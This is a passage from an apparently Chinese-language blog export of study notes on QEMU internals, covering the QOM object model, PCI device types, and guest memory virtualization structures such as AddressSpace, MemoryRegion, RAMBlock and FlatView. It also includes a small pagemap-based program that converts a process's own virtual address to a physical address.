//根据类名查type_table获取TypeImpl=&gt; object_new_with_type =&gt; type_initialize //创建TypeImpl对应的类对象，设置到对应TypeImpl-&gt;class中 =&gt; g_malloc(type-&gt;instance_size) //分配类实例对象的内存 =&gt; object_initialize_with_type //创建类实例对象 =&gt; type_initialize //会再次尝试实例化类对象 =&gt; obj-&gt;class = type-&gt;class //设置类实例对象的类对象为TypeImpl-&gt;class =&gt; obj-&gt;properties = g_hash_table_new_full //创建存放类实例对象property的hash table =&gt; object_init_with_type =&gt; object_init_with_type //如果TypeImpl有父类，递归调用object_init_with_type =&gt; ti-&gt;instance_init(obj) //如果定义了类实例的构造函数，调用之 添加Property在QEMU中每个对象或设备都有一些属性，这些属性有可能是设备的某种状态，也有可能是某个标志等。设备的属性是通过其类型(ObjectClass的properties成员)来定义的，但是具体的属性的值是保存在对象Object的properties成员的。 关系整理主要来梳理一下TypeInfo，TypeImpl，ObjectClass，Object之间的关系，因为TypeImpl是中间工具变量，所以将其与TypeInfo看为一类： 主要有三组： 最基础组，是所有设备的起点： 123456789101112131415161718192021222324252627static TypeInfo object_info = &#123; .name = TYPE_OBJECT, .instance_size = sizeof(Object), .instance_init = object_instance_init, .abstract = true,&#125;; struct ObjectClass&#123; /*&lt; private &gt;*/ Type type; GSList *interfaces; const char *object_cast_cache[OBJECT_CLASS_CAST_CACHE]; const char *class_cast_cache[OBJECT_CLASS_CAST_CACHE]; ObjectUnparent *unparent; GHashTable *properties;&#125;;struct Object&#123; /*&lt; private &gt;*/ ObjectClass *class; ObjectFree *free; GHashTable *properties; uint32_t ref; Object *parent;&#125;; 二组，基础设备组： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970// hw/core/qdev.cstatic const TypeInfo device_type_info = &#123; .name = TYPE_DEVICE, .parent = TYPE_OBJECT,//继承自一组的TypeInfo:object_info .instance_size = sizeof(DeviceState),//与DeviceState的联系 .instance_init = device_initfn, .instance_post_init = device_post_init, .instance_finalize = device_finalize, .class_base_init = device_class_base_init, .class_init = device_class_init, .abstract = true, .class_size = sizeof(DeviceClass),//与DeviceClass的联系&#125;;//include/hw/xtensa/qdev-core.htypedef struct DeviceClass &#123; /*&lt; private &gt;*/ ObjectClass parent_class;//存储父类型的内容 /*&lt; public &gt;*/ DECLARE_BITMAP(categories, DEVICE_CATEGORY_MAX); const char *fw_name;//firware名称 const char *desc; Property *props;//属性，在qemu中，每个设备都有各自的属性，以链表的形式保存在设备的根结构Object的properties字段中。但是每个设备有哪些属性，是在设备的类型中定义的，即这里的properties字段定义设备有哪些属性，设备类型的继承链上每个子类型都有可能定义一些属性，在设备初始化时，会遍历设备类型继承链，把所有属性都存放到Object的属性链表中 /* * Can this device be instantiated with -device / device_add? * All devices should support instantiation with device_add, and * this flag should not exist. But we're not there, yet. Some * devices fail to instantiate with cryptic error messages. * Others instantiate, but don't work. Exposing users to such * behavior would be cruel; clearing this flag will protect them. * It should never be cleared without a comment explaining why it * is cleared. * TODO remove once we're there */ bool user_creatable;//设备是否是可以由用户创建的，QEMU中并不是所有模拟的设备都是可以由用户通过命令行创建的，有些设备是要QEMU自动创建的，比如sysbus总线设备 bool hotpluggable;//设备是否是可插拔的 /* callbacks */ DeviceReset reset;//设备复位回调函数 DeviceRealize realize;//设备实例化回调函数。qemu的设备初始化分为两步，一个是设备类型中定义的构造函数(instance_init)，创建设备(object_new)时调用，另外一个是这里的realize函数，在设备的realied属性被设置为true时调用，realize函数被调用设备才是真正的被初始化并变的可用 DeviceUnrealize unrealize;//与realize回调函数对应，设备清理时调用 /* device state */ const struct VMStateDescription *vmsd;//该结构体用来保存设备的状态，在虚拟机迁移或冻结时使用 /* Private to qdev / bus. */ const char *bus_type;//总线类型，在qdev的设备模型中，每个设备都有其挂接的总线&#125; DeviceClass;//include/hw/xtensa/qdev-core.hstruct DeviceState &#123; /*&lt; private &gt;*/ Object parent_obj; /*&lt; public &gt;*/ const char *id; char *canonical_path; bool realized; bool pending_deleted_event; QemuOpts *opts; int hotplugged; BusState *parent_bus; QLIST_HEAD(, NamedGPIOList) gpios; QLIST_HEAD(, BusState) child_bus; int num_child_bus; int instance_id_alias; int alias_required_for_version;&#125;; 三组，pci基础设备组： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129// hw/pci/pci.cstatic const TypeInfo pci_device_type_info = &#123; .name = TYPE_PCI_DEVICE, .parent = TYPE_DEVICE, //继承自二组的TypeInfo:device_type_info .instance_size = sizeof(PCIDevice),//与PCIDevice的联系 .abstract = true, .class_size = sizeof(PCIDeviceClass),//与PCIDeviceClass的联系 .class_init = pci_device_class_init, .class_base_init = pci_device_class_base_init,&#125;;//include/hw/pci/pci.htypedef struct PCIDeviceClass &#123; DeviceClass parent_class; void (*realize)(PCIDevice *dev, Error **errp); PCIUnregisterFunc *exit; PCIConfigReadFunc *config_read; PCIConfigWriteFunc *config_write; uint16_t vendor_id; uint16_t device_id; uint8_t revision; uint16_t class_id; uint16_t subsystem_vendor_id; /* only for header type = 0 */ uint16_t subsystem_id; /* only for header type = 0 */ /* * pci-to-pci bridge or normal device. * This doesn't mean pci host switch. * When card bus bridge is supported, this would be enhanced. */ int is_bridge; /* rom bar */ const char *romfile;&#125; PCIDeviceClass;//include/hw/pci/pci.hstruct PCIDevice &#123; DeviceState qdev; /* PCI config space */ uint8_t *config; /* Used to enable config checks on load. Note that writable bits are * never checked even if set in cmask. */ uint8_t *cmask; /* Used to implement R/W bytes */ uint8_t *wmask; /* Used to implement RW1C(Write 1 to Clear) bytes */ uint8_t *w1cmask; /* Used to allocate config space for capabilities. */ uint8_t *used; /* the following fields are read only */ int32_t devfn; /* Cached device to fetch requester ID from, to avoid the PCI * tree walking every time we invoke PCI request (e.g., * MSI). For conventional PCI root complex, this field is * meaningless. */ PCIReqIDCache requester_id_cache; char name[64]; PCIIORegion io_regions[PCI_NUM_REGIONS]; AddressSpace bus_master_as; MemoryRegion bus_master_container_region; MemoryRegion bus_master_enable_region; /* do not access the following fields */ PCIConfigReadFunc *config_read; PCIConfigWriteFunc *config_write; /* Legacy PCI VGA regions */ MemoryRegion *vga_regions[QEMU_PCI_VGA_NUM_REGIONS]; bool has_vga; /* Current IRQ levels. Used internally by the generic PCI code. */ uint8_t irq_state; /* Capability bits */ uint32_t cap_present; /* Offset of MSI-X capability in config space */ uint8_t msix_cap; /* MSI-X entries */ int msix_entries_nr; /* Space to store MSIX table &amp; pending bit array */ uint8_t *msix_table; uint8_t *msix_pba; /* MemoryRegion container for msix exclusive BAR setup */ MemoryRegion msix_exclusive_bar; /* Memory Regions for MSIX table and pending bit entries. */ MemoryRegion msix_table_mmio; MemoryRegion msix_pba_mmio; /* Reference-count for entries actually in use by driver. */ unsigned *msix_entry_used; /* MSIX function mask set or MSIX disabled */ bool msix_function_masked; /* Version id needed for VMState */ int32_t version_id; /* Offset of MSI capability in config space */ uint8_t msi_cap; /* PCI Express */ PCIExpressDevice exp; /* SHPC */ SHPCDevice *shpc; /* Location of option rom */ char *romfile; bool has_rom; MemoryRegion rom; uint32_t rom_bar; /* INTx routing notifier */ PCIINTxRoutingNotifier intx_routing_notifier; /* MSI-X notifiers */ MSIVectorUseNotifier msix_vector_use_notifier; MSIVectorReleaseNotifier msix_vector_release_notifier; MSIVectorPollNotifier msix_vector_poll_notifier;&#125;; 用一张我自己画的图片来整理一下在动态初始化时TypeImpl，ObjectClass和Object之间的关系：(PS：Object和ObjectClass里的指针是从其class元素发出的) 感悟&amp;参考QOM是一个很庞大的工程，虽然只学习了一点皮毛，但是已经借鉴了很多前辈的文章，这里只是浅显地分析了一下pcidevice相关的一小部分，还有bus相关的部分有时间再填坑，但这也只是qemu这个庞大软件的一小部分而已。。。不禁感叹自己的弱小与无力orz。 吾尝终日而思矣，不如须臾之所学也。 感觉我们在学习qemu相关的知识时一定要利用好其开源的特性，这点十分重要，不懂的地方没有比读源码更快更正确的解决方式了。 借鉴了些前辈的文章，十分感激： https://www.binss.me/blog/qemu-note-of-qemu-object-model/ https://blog.csdn.net/sungeshilaoda/article/details/97890633 https://blog.csdn.net/sungeshilaoda/article/details/97890633]]></content>
      <categories>
        <category>Qemu&amp;KVM学习</category>
      </categories>
      <tags>
        <tag>summary</tag>
        <tag>Qemu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Qemu学习-内存虚拟化]]></title>
    <url>%2F2020%2F08%2F10%2FQemu%E5%AD%A6%E4%B9%A0%E2%80%94%E5%86%85%E5%AD%98%E8%99%9A%E6%8B%9F%E5%8C%96%2F</url>
    <content type="text"><![CDATA[Qemu内存模拟词汇约定 缩写 意义 VA Virtual Address 虚拟地址 PA Physical Address 物理地址 PT Page Table 页表(一级页表) PDT Page Directory Table 页目录表(二级页表) PDPT Page Directory Pointers Table 页目录指针表(三级页表) PML4T Page Map Level 4 Table 四级页表 PGD Page Global Directory 页全局目录 PUD Page Upper Directory 页上级目录 PMD Page Middle Directory 页中间目录 GVA Guest Virtual Address 客户机虚拟地址 GPA Guest Physical Address 客户机物理地址 HVA Host Virtual Address 宿主机虚拟地址 HPA Host Physical Address 宿主机物理地址 GFN Guest Frame Number 虚拟机的页框号 PFN Host Page Frame Number 宿主机的页框号 SPT Shadow Page Table 影子页表 我们主要研究的是GVA，GPA，HVA，HPA之间的关系和相互转化。 Qemu的内存模拟Qemu利用mmap系统调用，在Qemu进程的虚拟地址空间中申请连续的大小的空间，作为Guest的物理内存，即内存的申请是在用户空间完成的。 通过kvm提供的API，Qemu将Guest内存的地址信息传递并注册到kvm中维护，即内存的管理是由内核空间的kvm实现的。 即：Qemu负责申请客户机物理内存，kvm负责管理客户机物理内存。 在这样的架构下，内存地址访问有四层映射： GVA=&gt;GPA=&gt;HVA=&gt;HPA GVA=&gt;GPA的映射由guest OS负责维护，而HVA =&gt;HPA由host OS负责维护。而内存虚拟化的关键是GPA=&gt;HVA的映射。 12345678910111213141516171819202122232425 Guest's processes +--------------------+GVA | | +--------------------+ | | \__ Page Table \__ \ \ | | Guest kernel +----+--------------------+----------------+GHA | | | | +----+--------------------+----------------+ | | \__ \__ \ \ | QEMU process | +----+------------------------------------------+HVA | | | +----+------------------------------------------+ | | \__ Page Table \__ \ \ | | +----+-----------------------------------------------++HPA | | || +----+-----------------------------------------------++ 为了提高从GVA到HPA的转换效率，KVM常用的实现有SPT(Shadow Page Table)和EPT/NPT，前者通过软件维护影子页表直接将GVA转换成HPA，省略中间的映射；后者通过硬件特性实现二级映射(two dimentional paging)，将GPA转换成HPA。 GVA=&gt;GPA我们先来分析一下GVA=&gt;GPA，这是比较基础的计算机知识，也是写qemu漏洞利用经常用到的地方，例子如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;assert.h&gt;#include &lt;inttypes.h&gt;#define PAGE_SHIFT 12#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)#define PFN_PRESENT (1ull &lt;&lt; 63)#define PFN_PFN ((1ull &lt;&lt; 55) - 1)int fd;uint32_t page_offset(uint32_t addr)&#123; return addr &amp; ((1 &lt;&lt; PAGE_SHIFT) - 1);&#125;uint64_t gva_to_gfn(void *addr)&#123; uint64_t pme, gfn; size_t offset; offset = ((uintptr_t)addr &gt;&gt; 9) &amp; ~7; lseek(fd, offset, SEEK_SET); read(fd, &amp;pme, 8); if (!(pme &amp; PFN_PRESENT)) return -1; gfn = pme &amp; PFN_PFN; return gfn;&#125;uint64_t gva_to_gpa(void *addr)&#123; uint64_t gfn = gva_to_gfn(addr); assert(gfn != -1); return (gfn &lt;&lt; PAGE_SHIFT) | page_offset((uint64_t)addr);&#125;int main()&#123; uint8_t *ptr; uint64_t ptr_mem; fd = open("/proc/self/pagemap", O_RDONLY); if (fd &lt; 0) &#123; perror("open"); exit(1); &#125; ptr = malloc(256); strcpy(ptr, "Where am I?"); printf("%s\n", ptr); ptr_mem = gva_to_gpa(ptr); printf("Your physical address is at 0x%"PRIx64"\n", ptr_mem); getchar(); return 0;&#125;//=========================================================================================root@debian:~# ./mmuWhere am I?Your physical address is at 0x78b0d010(gdb) info proc mappingsprocess 14791Mapped address spaces: Start Addr End Addr Size Offset objfile 0x7fc314000000 0x7fc314022000 0x22000 0x0 0x7fc314022000 0x7fc318000000 0x3fde000 0x0 0x7fc319dde000 0x7fc31c000000 0x2222000 0x0 0x7fc31c000000 0x7fc39c000000 0x80000000 0x0 ...(gdb) x/s 0x7fc31c000000 + 0x78b0d0100x7fc394b0d010: "Where am I?" gva_to_gpa函数原理下方文章里解释地非常详细，这里不再多赘述： 通过/proc/self/pagemap文件 通过CR3寄存器 GPA=&gt;HVA这个是比较复杂的地方，也是Qemu内存模拟的核心，主要有两种方法，一种是SPT，一种是EPT(Extent Page Table)，前者通过软件维护影子页表，后者通过硬件特性实现二级映射。 SPT(影子页表)KVM通过维护记录GVA=&gt;HPA的影子页表SPT，减少了地址转换带来的开销，可以直接将GVA转换为HPA。 在软件虚拟化的内存转换中，GVA到GPA的转换通过查询CR3寄存器来完成，CR3中保存了Guest的页表基地址，然后载入MMU中进行地址转换。 在加入了SPT技术后，当Guest访问CR3时，KVM会捕获到这个操作EXIT_REASON_CR_ACCESS，之后KVM会载入特殊的CR3和影子页表，欺骗Guest这就是真实的CR3。之后就和传统的访问内存方式一致，当需要访问物理内存的时候，只会经过一层影子页表的转换。 影子页表由KVM维护，实际上就是一个Guest页表到Host 页表的映射。KVM会将Guest的页表设置为只读，当Guest OS对页表进行修改时就会触发Page Fault，VM-EXIT到KVM，之后KVM会对GVA对应的页表项进行访问权限检查，结合错误码进行判断： 如果是Guest OS引起的，则将该异常注入回去，Guest OS将调用自己的缺页处理函数，申请一个Page，并将Page的GPA填充到上级页表项中。 如果是Guest OS的页表和SPT不一致引起的，则同步SPT，根据Guest页表和mmap映射找到GPA到HVA的映射关系，然后在SPT中增加/更新GVA-HPA表项。 为了快速检索Guest页表对应的影子页表，KVM为每个客户机维护了一个hash表来进行客户机页表到影子页表之间的映射。对于每一个Guest来说，其页目录和页表都有唯一的GPA，通过页目录/页表的GPA就可以在哈希链表中快速地找到对应的影子页目录/页表。 当Guest切换进程时，会把带切换进程的页表基址载入到Guest的CR3中，导致VM-EXIT到KVM中，KVM再通过哈希表找到对应的 SPT，然后加载到机器的CR3中。 优点：影子页表的引入，减少了GVA=&gt;HPA的转换开销。 缺点：需要为Guest的每个进程都维护一个影子页表，这将带来很大的内存开销。同时影子页表的建立是很耗时的，如果Guest的进程过多，将导致影子页表频繁切换。因此Intel和AMD在此基础上提供了基于硬件的虚拟化技术。 EPT/NPTIntel的EPT(Extent Page Table)技术和AMD的NPT(Nest Page Table)技术都对内存虚拟化提供了硬件支持。这两种技术原理类似，都是在硬件层面上实现GVA到HPA之间的转换。下面就以EPT为例分析一下KVM基于硬件辅助的内存虚拟化实现。 Intel EPT技术引入了EPT(Extended Page Table)和EPTP(EPT base pointer EPT页表基址寄存器)的概念。EPT中维护着GPA到 HPA的映射，而EPTP负责指向EPT基址，类似于CR3指向Guest OS页表基址。 在Guest OS运行时，Guest对应的EPT地址被加载到EPTP，而Guest OS当前运行的进程页表基址被加载到CR3。于是在进行地址转换时，首先通过CR3指向的页表实现GVA到GPA的转换，再通过EPTP指向的EPT完成GPA到HPA的转换。当发生EPT Page Fault时，需要VM-EXIT到KVM，更新EPT。 优点：Guest的缺页在Guest OS内部处理，不会VM-EXIT到KVM中。地址转化基本由硬件(MMU)查页表来完成，大大提升了效率，且只需为Guest维护一份EPT页表，减少内存的开销。 缺点：两级页表查询，只能寄望于TLB命中。 Qemu与KVM的分工合作QEMU和KVM之间是通过KVM提供的ioctl()接口进行交互的。在linux kernel 2.6的kvm_vm_ioctl()函数中，设置虚拟机内存的系统调用为KVM_SET_USER_MEMORY_REGION： 123456789101112131415161718192021// /virt/kvm/kvm_main.cstatic long kvm_vm_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg)&#123; /* ... */ case KVM_SET_USER_MEMORY_REGION: &#123; // 在 KVM 中注册用户空间传入的内存信息 struct kvm_userspace_memory_region kvm_userspace_mem; r = -EFAULT; // 将传入的数据结构复制到内核空间 if (copy_from_user(&amp;kvm_userspace_mem, argp, sizeof kvm_userspace_mem)) goto out; // 实际进行处理的函数 r = kvm_vm_ioctl_set_memory_region(kvm, &amp;kvm_userspace_mem, 1); if (r) goto out; break; &#125; /* ... */&#125; 参数类型为kvm_userspace_memory_region： 12345678/* for KVM_SET_USER_MEMORY_REGION */struct kvm_userspace_memory_region &#123; __u32 slot; // slot 编号 __u32 flags; // 标志位,例如是否追踪脏页、是否可用等 __u64 guest_phys_addr; // Guest 物理地址，即 GPA __u64 memory_size; // 内存大小,单位 bytes __u64 userspace_addr; // 从 QEMU 进程地址空间中分配内存的起始地址,即 HVA&#125;; KVM_SET_USER_MEMORY_REGION这个ioctl主要目的就是设置GPA=&gt;HVA的映射关系，KVM会继续调用kvm_vm_ioctl_set_memory_region()，在内核空间维护并管理Guest的内存。 核心数据结构AddressSpace12345678910111213141516171819// include/exec/memory.h/** * AddressSpace: describes a mapping of addresses to #MemoryRegion objects */struct AddressSpace &#123; /* All fields are private. */ struct rcu_head rcu; char *name; MemoryRegion *root; //root级MemoryRegion /* Accessed via RCU. */ struct FlatView *current_map; //相对应的FlatView平面展开视图 int ioeventfd_nb; struct MemoryRegionIoeventfd *ioeventfds; QTAILQ_HEAD(memory_listeners_as, MemoryListener) listeners; QTAILQ_ENTRY(AddressSpace) address_spaces_link;&#125;; QEMU用AddressSpace结构体表示Guest中CPU/设备看到的内存，类似于物理机中地址空间的概念，但在这里表示的是Guest的一段地址空间，如内存地址空间address_space_memory、I/O 地址空间address_space_io。 每个AddressSpace一般包含一系列的MemoryRegion：root指针指向根级MemoryRegion，而root可能有自己的若干个subregions，于是形成树状结构。这些MemoryRegion通过树连接起来，树的根即为AddressSpace的root域。 AddressSpace有两个静态全局变量address_space_memory和address_space_io，这两个变量的root域分别指向后面要说的system_memory和syetem_io。 123// exec.c 可能不同版本的qemu源码位置不一样static AddressSpace address_space_memory; // 内存地址空间static AddressSpace address_space_io; // I/O 地址空间 MemoryRegionMemoryRegion表示在Guest Memory Layout中的一段内存区域，它是联系GPA和RAMBlocks(描述真实内存)之间的桥梁。 123456789101112131415161718192021222324252627282930313233343536373839404142// include/exec/memory.hstruct MemoryRegion &#123; Object parent_obj; /* All fields are private - violators will be prosecuted */ /* The following fields should fit in a cache line */ bool romd_mode; bool ram; //表示是否为RAM bool subpage; bool readonly; /* For RAM regions */ bool nonvolatile; bool rom_device; bool flush_coalesced_mmio; bool global_locking; uint8_t dirty_log_mask; bool is_iommu; RAMBlock *ram_block; //指向对应的RAMBlock Object *owner; const MemoryRegionOps *ops; //回调函数集合 void *opaque; MemoryRegion *container; Int128 size; //该区域内存大小 hwaddr addr; void (*destructor)(MemoryRegion *mr); uint64_t align; bool terminates; bool ram_device; bool enabled; bool warning_printed; /* For reservations */ uint8_t vga_logging_count; MemoryRegion *alias; //若不为0,则代表自己为alias MemoryRegion,并指向实体的MemoryRegion hwaddr alias_offset; //若为alias,则为实体MemoryRegion中RAMBlock的host指向地址中的offset int32_t priority; QTAILQ_HEAD(subregions, MemoryRegion) subregions; //子区域链表头 QTAILQ_ENTRY(MemoryRegion) subregions_link; //子区域链表节点 QTAILQ_HEAD(coalesced_ranges, CoalescedMemoryRange) coalesced; const char *name; //此MemoryRegion的name,调试时使用 unsigned ioeventfd_nb; MemoryRegionIoeventfd *ioeventfds;&#125;; 其同样有两个全局变量system_memory和system_io： 123// exec.cstatic MemoryRegion *system_memory; // 内存 MemoryRegion，对应 address_space_memorystatic MemoryRegion *system_io; // I/O MemoryRegion，对应 address_space_io` MemoryRegion有多种类型，可以表示一段RAM、ROM、MMIO、alias。 若为alias则表示一个MemoryRegion的部分区域，例如QEMU会为pc.ram这个表示RAM的MemoryRegion添加两个alias：ram-below-4g和ram-above-4g，之后会有代码解释。 另外，MemoryRegion也可以表示一个container，这就表示它只是其他若干个MemoryRegion的容器。 那么要如何创建不同类型的MemoryRegion呢？在QEMU中实际上是通过调用不同的初始化函数区分的。根据不同的初始化函数及其功能，可以将MemoryRegion划分为以下三种类型： root MemoryRegion： 直接通过memory_region_init初始化，没有自己的内存，用于管理subregion，例如之前说的system_memory： 123456789101112131415161718192021222324252627282930313233343536void memory_region_init(MemoryRegion *mr, Object *owner, const char *name, uint64_t size)&#123; object_initialize(mr, sizeof(*mr), TYPE_MEMORY_REGION); memory_region_do_init(mr, owner, name, size);&#125;static void memory_region_do_init(MemoryRegion *mr, Object *owner, const char *name, uint64_t size)&#123; mr-&gt;size = int128_make64(size); if (size == UINT64_MAX) &#123; mr-&gt;size = int128_2_64(); &#125; mr-&gt;name = g_strdup(name); mr-&gt;owner = owner; mr-&gt;ram_block = NULL; //无自己的RAMBloack,即没有自己的内存 if (name) &#123; char *escaped_name = memory_region_escape_name(name); char *name_array = g_strdup_printf("%s[*]", escaped_name); if (!owner) &#123; owner = container_get(qdev_get_machine(), "/unattached"); &#125; object_property_add_child(owner, name_array, OBJECT(mr), &amp;error_abort); object_unref(OBJECT(mr)); g_free(name_array); g_free(escaped_name); &#125;&#125; 实体 MemoryRegion： 通过memory_region_init_ram初始化，有自己的内存(从qemu进程地址空间中分配)，大小为size，例如ram_memory，pci_memory： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172void *pc_memory_init(MemoryRegion *system_memory, const char *kernel_filename, const char *kernel_cmdline, const char *initrd_filename, ram_addr_t below_4g_mem_size, ram_addr_t above_4g_mem_size, MemoryRegion *rom_memory, MemoryRegion **ram_memory)&#123; MemoryRegion *ram, *option_rom_mr; /* ...*/ option_rom_mr = g_malloc(sizeof(*option_rom_mr)); //调用memory_region_init_ram对ram_memory初始化 memory_region_init_ram(option_rom_mr, NULL, "pc.rom", PC_ROM_SIZE, &amp;error_fatal); /* ... */&#125;void memory_region_init_ram(MemoryRegion *mr, struct Object *owner, const char *name, uint64_t size, Error **errp)&#123; DeviceState *owner_dev; Error *err = NULL; memory_region_init_ram_nomigrate(mr, owner, name, size, &amp;err); if (err) &#123; error_propagate(errp, err); return; &#125; /* This will assert if owner is neither NULL nor a DeviceState. * We only want the owner here for the purposes of defining a * unique name for migration. TODO: Ideally we should implement * a naming scheme for Objects which are not DeviceStates, in * which case we can relax this restriction. */ owner_dev = DEVICE(owner); vmstate_register_ram(mr, owner_dev);&#125;void memory_region_init_ram_nomigrate(MemoryRegion *mr, Object *owner, const char *name, uint64_t size, Error **errp)&#123; memory_region_init_ram_shared_nomigrate(mr, owner, name, size, false, errp);&#125;void memory_region_init_ram_shared_nomigrate(MemoryRegion *mr, Object *owner, const char *name, uint64_t size, bool share, Error **errp)&#123; Error *err = NULL; memory_region_init(mr, owner, name, size); mr-&gt;ram = true; //为RAM mr-&gt;terminates = true; mr-&gt;destructor = memory_region_destructor_ram; mr-&gt;ram_block = qemu_ram_alloc(size, share, mr, &amp;err);//从qemu的进程地址空间中申请此MemoryRegion的RAMBloack结构体内存并将指针填入ram_block,RAMBloack才是记录实际分配的内存地址信息的结构体,后面会分析到。 mr-&gt;dirty_log_mask = tcg_enabled() ? (1 &lt;&lt; DIRTY_MEMORY_CODE) : 0; if (err) &#123; mr-&gt;size = int128_zero(); object_unparent(OBJECT(mr)); error_propagate(errp, err); &#125;&#125; alias MemoryRegion： 通过memory_region_init_alias() 初始化，没有自己的内存，表示实体 MemoryRegion的一部分。通过alias成员指向实体 MemoryRegion，alias_offset为在实体 MemoryRegion中的偏移量，例如ram_below_4g、ram_above_4g： 123456789101112131415161718192021222324252627282930313233343536373839404142void pc_memory_init(PCMachineState *pcms, MemoryRegion *system_memory, MemoryRegion *rom_memory, MemoryRegion **ram_memory)&#123; int linux_boot, i; MemoryRegion *ram, *option_rom_mr; MemoryRegion *ram_below_4g, *ram_above_4g; FWCfgState *fw_cfg; MachineState *machine = MACHINE(pcms); PCMachineClass *pcmc = PC_MACHINE_GET_CLASS(pcms); assert(machine-&gt;ram_size == pcms-&gt;below_4g_mem_size + pcms-&gt;above_4g_mem_size); linux_boot = (machine-&gt;kernel_filename != NULL); /* Allocate RAM. We allocate it as a single memory region and use * aliases to address portions of it, mostly for backwards compatibility * with older qemus that used qemu_ram_alloc(). */ ram = g_malloc(sizeof(*ram)); memory_region_allocate_system_memory(ram, NULL, "pc.ram", machine-&gt;ram_size); *ram_memory = ram; ram_below_4g = g_malloc(sizeof(*ram_below_4g)); memory_region_init_alias(ram_below_4g, NULL, "ram-below-4g", ram, 0, pcms-&gt;below_4g_mem_size); /*...*/&#125;void memory_region_init_alias(MemoryRegion *mr, Object *owner, const char *name, MemoryRegion *orig, hwaddr offset, uint64_t size)&#123; memory_region_init(mr, owner, name, size); mr-&gt;alias = orig; //指向实体MemoryRegion mr-&gt;alias_offset = offset; //实体MemoryRegion的RAMBlock的host指向的地址中的偏移&#125; RAMBlockMemoryRegion用来描述一段逻辑层面上的内存区域，而记录实际分配的内存地址信息的结构体则是RAMBlock： 1234567891011121314151617181920212223242526272829// include/exec/ram_addr.hstruct RAMBlock &#123; struct rcu_head rcu; struct MemoryRegion *mr; //唯一对应的MemoryRegion uint8_t *host; //RAMBlock关联的内存,HVA uint8_t *colo_cache; /* For colo, VM's ram cache */ ram_addr_t offset; //RAMBlock在VM物理内存中的偏移量,即GPA ram_addr_t used_length; ram_addr_t max_length; void (*resized)(const char*, uint64_t length, void *host); uint32_t flags; /* Protected by iothread lock. */ char idstr[256]; //RAMBlock的id /* RCU-enabled, writes protected by the ramlist lock */ QLIST_ENTRY(RAMBlock) next; //指向下一个RAMBlock QLIST_HEAD(, RAMBlockNotifier) ramblock_notifiers; int fd; size_t page_size; /* dirty bitmap used during migration */ unsigned long *bmap; /* bitmap of pages that haven't been sent even once * only maintained and used in postcopy at the moment * where it's used to send the dirtymap at the start * of the postcopy phase */ unsigned long *unsentmap; /* bitmap of already received pages in postcopy */ unsigned long *receivedmap;&#125;; 可以看到在RAMBlock中host和offset域分别对应了HVA和GPA，因此也可以说RAMBlock 中存储了GPA-&gt;HVA的映射关系，另外每一个RAMBlock都会指向其所属的MemoryRegion。 全局变量ramlist以单链表的形式管理所有的RAMBlock： 1234567891011// include/exec/ramlist.htypedef struct RAMList &#123; QemuMutex mutex; RAMBlock *mru_block; /* RCU-enabled, writes protected by the ramlist lock. */ QLIST_HEAD(, RAMBlock) blocks; DirtyMemoryBlocks *dirty_memory[DIRTY_MEMORY_NUM]; uint32_t version; QLIST_HEAD(, RAMBlockNotifier) ramblock_notifiers;&#125; RAMList;extern RAMList ram_list; 每一个新分配的RAMBlock都会被插入到ram_list的头部。如需查找地址所对应的RAMBlock，则需要遍历ram_list，当目标地址落在当前RAMBlock的地址区间时，该RAMBlock即为查找目标。 关系小结AddressSpace、MemoryRegion、RAMBlock之间的关系如下所示： 可以看到AddressSpace的root域指向根级MemoryRegion，AddressSpace是由root域指向的MemoryRegion及其子树共同表示的。MemoryRegion作为一个逻辑层面的内存区域，还需借助分布在其中的RAMBlock来存储真实的地址映射关系。 FlatViewAddressSpace 的root域及其子树共同构成了 Guest 的物理地址空间，但这些都是在QEMU侧定义的。要传入KVM进行设置时，复杂的树状结构是不利于内核进行处理的，因此需要将其转换为一个平坦的地址模型，也就是一个从零开始、只包含地址信息的数据结构，这在QEMU中通过FlatView来表示。每个AddressSpace都有一个与之对应的FlatView指针current_map，表示其对应的平面展开视图。 12345678910111213// include/exec/memory.h/* Flattened global view of current active memory hierarchy. Kept in sorted * order. */struct FlatView &#123; struct rcu_head rcu; unsigned ref; FlatRange *ranges; //对应的FlatRange数组 unsigned nr; //FlatRange的数目 unsigned nr_allocated; //当前数组的项数 struct AddressSpaceDispatch *dispatch; MemoryRegion *root;&#125;; 在FlatView中，FlatRange表示在FlatView中的一段内存范围： 1234567891011// memory.c/* Range of memory in the global map. Addresses are absolute. */struct FlatRange &#123; MemoryRegion *mr; //指向所属的MemoryRegion hwaddr offset_in_region; //在全局MemoryRegion中的offset,对应GPA AddrRange addr; //代表的地址区间,对应HVA uint8_t dirty_log_mask; bool romd_mode; bool readonly; bool nonvolatile;&#125;; 每个FlatRange对应一段虚拟机物理地址区间，各个FlatRange不会重叠，按照地址的顺序保存在数组中，具体的地址范围由一个 AddrRange结构来描述： 1234567891011// memory.ctypedef struct AddrRange AddrRange;/* * Note that signed integers are needed for negative offsetting in aliases * (large MemoryRegion::alias_offset). */struct AddrRange &#123; Int128 start; Int128 size;&#125;; MemoryRegionSection在QEMU中，还有几个起到中介作用的结构体，MemoryRegionSection就是其中之一。 之前介绍的FlatRange代表一个物理地址空间的片段，偏向于描述在Host侧即AddressSpace中的分布，而MemoryRegionSection则代表在Guest侧即MemoryRegion中的片段。 12345678910111213141516171819202122// include/exec/memory.h/** * MemoryRegionSection: describes a fragment of a #MemoryRegion * * @mr: the region, or %NULL if empty * @fv: the flat view of the address space the region is mapped in * @offset_within_region: the beginning of the section, relative to @mr's start * @size: the size of the section; will not exceed @mr's boundaries * @offset_within_address_space: the address of the first byte of the section * relative to the region's address space * @readonly: writes to this section are ignored * @nonvolatile: this section is non-volatile */struct MemoryRegionSection &#123; MemoryRegion *mr; //所属的MemoryRegion FlatView *fv; hwaddr offset_within_region; //在MemoryRegion内部的offset Int128 size; hwaddr offset_within_address_space; //在AddressSpace内部的offset bool readonly; bool 